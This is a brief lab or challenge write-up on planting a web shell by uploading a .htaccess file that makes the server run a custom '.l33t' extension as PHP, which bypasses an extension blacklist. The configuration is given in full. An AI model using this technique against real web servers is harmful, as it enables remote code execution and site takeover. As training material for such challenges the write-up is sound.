# Web shell upload via extension blacklist bypass

If there is a blacklist, and we can upload a .htaccess, we can set a custom extension to be interpreted and run as php. So first, we create a .htaccess:
> Note: `For this challenge, only the last line is necesarry.`
```
php_flag file_uploads On
php_flag engine On

php_value upload_max_filesize 1000M
php_value post_max_size 1000M

AddType application/x-httpd-php .l33t
``` 
After that, we can upload a normal php shell, but wiht .l33t extension.

